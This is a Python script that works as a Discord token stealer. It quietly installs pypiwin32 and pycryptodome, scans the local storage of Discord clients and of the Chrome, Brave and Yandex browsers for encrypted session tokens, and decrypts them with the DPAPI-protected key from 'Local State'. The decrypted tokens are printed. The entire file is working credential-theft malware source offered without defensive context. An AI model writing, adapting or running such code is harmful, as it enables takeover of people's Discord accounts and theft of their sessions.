import os
import re
import json
import base64
import subprocess
import sys

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = [
    ROAMING + '\\discord',
    ROAMING + '\\discordcanary',
    ROAMING + '\\Lightcord',
    ROAMING + '\\discordptb',
    LOCAL + '\\Google\\Chrome\\User Data\\Default',
    LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
]

def get_tokens(path):
    tokens = []
    leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
    if not os.path.exists(leveldb_path):
        return tokens

    for filename in os.listdir(leveldb_path):
        if not filename.endswith('.log') and not filename.endswith('.ldb'):
            continue
        try:
            with open(os.path.join(leveldb_path, filename), 'r', errors='ignore') as file:
                for line in file:
                    for match in re.findall(r'dQw4w9WgXcQ:[^\"]+', line):
                        tokens.append(match)
        except Exception:
            continue
    return tokens

def get_key(path):
    local_state_path = os.path.join(path, 'Local State')
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, 'r') as file:
        local_state = json.load(file)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_token(enc_token, key):
    try:
        enc_token = base64.b64decode(enc_token)
        iv = enc_token[3:15]
        payload = enc_token[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)[:-16]
        return decrypted.decode()
    except Exception:
        return None

def main():
    found_tokens = set()
    for path in PATHS:
        if not os.path.exists(path):
            continue
        key = get_key(path)
        if key is None:
            continue
        for token_entry in get_tokens(path):
            if not token_entry.startswith("dQw4w9WgXcQ:"):
                continue
            enc_token = token_entry.split("dQw4w9WgXcQ:")[1]
            token = decrypt_token(enc_token, key)
            if token and token not in found_tokens:
                found_tokens.add(token)
                print(token)

if __name__ == "__main__":
    main()
